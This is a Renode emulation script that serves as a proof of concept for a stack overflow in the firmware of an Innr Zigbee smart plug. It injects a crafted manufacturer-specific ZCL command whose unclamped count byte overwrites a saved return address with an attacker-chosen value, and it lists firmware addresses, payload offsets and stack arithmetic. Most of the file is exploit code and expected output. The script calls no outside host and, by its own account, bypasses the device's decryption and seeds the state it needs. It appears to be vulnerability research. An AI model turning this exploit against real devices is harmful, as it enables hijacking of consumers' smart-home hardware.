:name: ZB-03 Innr plug — ZCL-DISPATCH-INJECTION reachability PoC (SOURCE-side of dispatch -> SINK)
:description: Injects an ALREADY-DECRYPTED PLAINTEXT manufacturer-specific ZCL command at the firmware's ZCL command-dispatch fallthrough sub_C5F2 and lets the real Innr plug firmware's OWN code try its handler chain (sub_22BD8 -> sub_22E06 -> ...), pass sub_22E06's entry gate (a2[0]==0 && a2[1]==entry[8]|0x8000==0x8004, table keyed by a3[0]), select the case-0x8004 body 0x22E5C, and reach the vulnerable unbounded record-copy sink. No PC is forced into the gate or the sink: only the dispatch fallthrough ENTRY is entered with the register/stack contract sub_F8A8 would set up. This closes two axes the earlier function-level PoC (zb03_validate.resc, which jumped straight to the case body 0x22E5C) skipped: (1) GATE REACHABILITY (the firmware's own dispatch routes mfg-cmd 0x8004 through the entry gate to the sink) and (2) PARAMETER FIDELITY (the attacker count byte a3[11] flows UNCLAMPED to the OOB stack write).
#
# ============================ RESULT (reproduced 2026-07-13) ============================
#   Marker order (all NATURAL, fired by the firmware's own branches/calls):
#       MARK_C5F2_DISPATCH -> MARK_C64A_TO_22E06 -> MARK_22E06_ENTRY -> MARK_22E5C_GATE_OK
#   sub_23046 table lookup returned entry = 0x2000F434 (the seeded row).
#   saved-LR slot @0x20006FBC:  0xAABBCCDD  (sentinel, before)
#                            -> 0x20006E01  (attacker-chosen, after; from payload a3[124..127])
#   => The firmware's OWN command dispatch (sub_C5F2) tried handler sub_22BD8 (returned 0),
#      fell through and CALLED sub_22E06, whose entry gate looked up the mfg command in the
#      table, matched cmd 0x8004, selected the case-0x8004 body, and the unclamped count
#      a3[11]=0x3A=58 overflowed the stack buffer, overwriting sub_22E06's own saved LR via
#      the natural path -- with NO forced PC into the gate or the sink.
#
# ============================ FORCED vs NATURAL ============================
#   FORCED (emulation scaffolding, minimal):
#     * The plaintext ZCL command is written into scratch RAM and the CPU is entered at
#       sub_C5F2 (0xC5F2) with r0..r3 + stack args (arg5=len@[sp+0x40], arg6=payload@
#       [sp+0x44]) exactly as sub_F8A8 (0xf8e4) would pass them. This deliberately
#       BYPASSES NWK/APS decryption, APS addressing, the ZCL header parse, and the
#       0x52-byte payload copy in sub_F882. It proves "a ZCL command that reaches command
#       dispatch IS routed to sub_22E06 with attacker params", NOT the crypto-authed path.
#     * The manufacturer-command table row @0x2000F434 is pre-seeded (entry[0]=1 (!=0),
#       entry[8]=0x0004 so (|0x8000)==0x8004, entry[10]==a3[0]==0). On the real device this
#       row is populated at endpoint/cluster registration; seeding it stands in for a
#       registered mfg command handler.
#     * The lazy-init guard byte @0x2000FFAA is set to 1 so sub_22FEE (called from the
#       lookup sub_23046) treats the table as already-initialized and does NOT zero it.
#       On the real device this flag is set the first time a mfg command is looked up
#       AFTER the rows are registered; here we set it so the pre-seeded row survives.
#   NATURAL (firmware's own execution, from sub_C5F2 down -- NO forced PC):
#     * sub_C5F2 builds a local cmd descriptor (sub_164AE/F6A0/F6A4/6352), then tries
#       handler sub_22BD8 (0xc63c). sub_22BD8 returns 0, so sub_C5F2 FALLS THROUGH and
#       CALLS sub_22E06 (0xc64a) with r0=ctx, r1=cmd-struct(a2), r2=payload(a3), r3=len(a4).
#     * sub_22E06 entry gate (0x22e18-0x22e58): sub_23046 looks up a3[0] in the table
#       @0x2000F434, requires entry[0]!=0, a2[0]==0, a2[1]==(entry[8]|0x8000)==0x8004,
#       a3[1]==0; the switch on (a2[1]-0x8000) then selects the case-0x8004 body 0x22E5C.
#     * case-0x8004 body reads count1 = a3[11] UNCLAMPED and its per-record loop writes
#       halfword records via `strh.w r8,[r11,r7,lsl #1]` @0x22ee2 into a stack buffer at
#       SP_f+0x24; halfword index 56 lands on sub_22E06's own saved LR, so count>=58
#       overwrites the return address with attacker bytes a3[124..127].
#
# ============================ SP / saved-LR arithmetic ============================
#   Enter sub_C5F2 with SP S0=0x20007000 (scratch region, clear of the firmware RAM
#   globals that cluster around 0x2000Dxxx-0x2000FFAA; a top-of-RAM stack would trample
#   the lazy-init flag @0x2000FFAA via the helper calls before the gate reads it).
#     sub_C5F2 prologue: push{8}(0x20) + sub sp,#0x20  => SP=S0-0x40=0x20006FC0 at bl 22E06
#     sub_22E06 entry SP = 0x20006FC0; saved LR (last of push{r3..r11,lr}) at SP-4 = 0x20006FBC
#     sub_22E06 prologue: push{10}(0x28)+sub sp,#0x70 => SP_f=0x20006F28; buffer=SP_f+0x24=0x20006F4C
#     halfword index 56 = buffer + 0x70 = 0x20006FBC == saved-LR slot.  <-- overwrite target
#   C5F2 stack args (read once at prologue): arg5 len @[sp+0x40]=0x20007000,
#                                            arg6 payload @[sp+0x44]=0x20007004.
# =======================================================================================

$bin=@scripts/silabs-vuln/zb03_innr.elf
include @scripts/silabs-vuln/boot_mg21.resc
logLevel 3

# COLD hooks (each fires once on this path -> no flooding). The hot OOB store 0x22ee2
# is NOT hooked (it runs per record); the saved-LR overwrite is caught by a watchpoint.
cpu AddHook 0xc5f2  "self.ErrorLog('MARK_C5F2_DISPATCH  (ZCL command-dispatch fallthrough entered)')"
cpu AddHook 0xc64a  "self.ErrorLog('MARK_C64A_TO_22E06  (sub_22BD8 returned 0 -> firmware CALLS sub_22E06)')"
cpu AddHook 0x22e06 "self.ErrorLog('MARK_22E06_ENTRY    (sink entry, running entry gate)')"
cpu AddHook 0x22e5c "self.ErrorLog('MARK_22E5C_GATE_OK  (entry gate passed -> case-0x8004 body selected)')"
cpu AddHook 0x22e1e "self.ErrorLog('    sub_23046 table lookup returned entry = 0x{0:X}'.format(self.GetRegister(0).RawValue))"
cpu AddHook 0x22ff8 "self.ErrorLog('WARN: sub_22FEE init-body ran (flag was 0 -> table would be WIPED)')"

# Boot through clock/power/radio bring-up.
emulation RunFor "0.3"
pause
echo ">>> post-boot PC (expect advanced past reset/bring-up):"
cpu PC

# --- Pre-seed the lazy-init guard so sub_22FEE keeps the table (see FORCED note) --------
sysbus WriteByte 0x2000FFAA 0x01

# --- Pre-seed the manufacturer-command table row @0x2000F434 (looked up by a3[0]) -------
#   entry[0]=1 (!=0), entry[8]=0x0004 (halfword), entry[10]=0x00 (==a3[0]).
sysbus WriteDoubleWord 0x2000F434 0x00000001
sysbus WriteDoubleWord 0x2000F43C 0x00000004
echo ">>> table row @0x2000F434 seeded: entry[0..3], entry[8..11] ="
sysbus ReadDoubleWord 0x2000F434
sysbus ReadDoubleWord 0x2000F43C

# --- Craft the PLAINTEXT payload a3 @0x20002000 (zero, then set count + LR sentinel) ----
python "for a in range(0x20002000,0x200020C0,4): monitor.Machine.SystemBus.WriteDoubleWord(a,0)"
#   a3[11]=0x3A=58 (UNCLAMPED count1)   a3[0]=a3[1]=0 (table key / guard)
sysbus WriteDoubleWord 0x20002008 0x3A000000
#   a3[124..127] = 0x20006E01 (LE 01 6E 00 20) -> the value written onto the saved LR slot
sysbus WriteDoubleWord 0x2000207C 0x20006E01

# --- Craft the a2 command struct @0x20002200: a2[0]=0x0000, a2[1](@+2)=0x8004 -----------
sysbus WriteDoubleWord 0x20002200 0x80040000

# --- sub_C5F2 incoming stack args (arg5=len, arg6=payload) at SP=0x20007000 -------------
#   a4 len = 13 (parity (13-13)==0 even, as in zb03_validate.resc)
sysbus WriteDoubleWord 0x20007000 0x0000000D
sysbus WriteDoubleWord 0x20007004 0x20002000

# --- Pre-place a saved-LR sentinel where sub_22E06's saved LR lands (0x20006FBC) --------
sysbus WriteDoubleWord 0x20006FBC 0xAABBCCDD
echo ">>> BEFORE: sink saved-LR slot @0x20006FBC (sentinel) ="
sysbus ReadDoubleWord 0x20006FBC
# HalfWord watchpoint: the sink store @0x22ee2 is a 16-bit `strh.w`, so a HalfWord hook
# isolates the SINK's OOB write (the earlier word-width LR pushes by C5F2's helper calls
# into this live stack slot are NOT caught by a HalfWord watchpoint).
sysbus AddWatchpointHook 0x20006FBC Word Write "self.ErrorLog('>>> WATCHPOINT: firmware sink strh.w OOB store hit saved-LR slot 0x20006FBC, halfword = 0x{0:X}'.format(value))"

# --- Register contract sub_F8A8 would hand sub_C5F2 -------------------------------------
#   r0=ctx (unused by gate)  r1=a2 cmd struct  r2/r3 = C5F2 a3/a4 (only feed local descr)
#   SP = fresh scratch stack  LR = 0xDEAD sentinel (a return would fault; irrelevant)
sysbus.cpu SetRegister 0  0x00000000
sysbus.cpu SetRegister 1  0x20002200
sysbus.cpu SetRegister 2  0x00000000
sysbus.cpu SetRegister 3  0x00000000
sysbus.cpu SetRegister 13 0x20007000
sysbus.cpu SetRegister 14 0x0000DEAD
sysbus.cpu PC 0xc5f2

# Let the firmware's OWN dispatch carry the injected command down to the sink.
emulation RunFor "0.002"
pause

echo ">>> AFTER: sink saved-LR slot @0x20006FBC (expect 0x20006E01) ="
sysbus ReadDoubleWord 0x20006FBC
echo ">>> (see MARK_* above: C5F2 -> C64A(->22E06) -> 22E06_ENTRY -> 22E5C_GATE_OK = natural dispatch+gate)"
quit
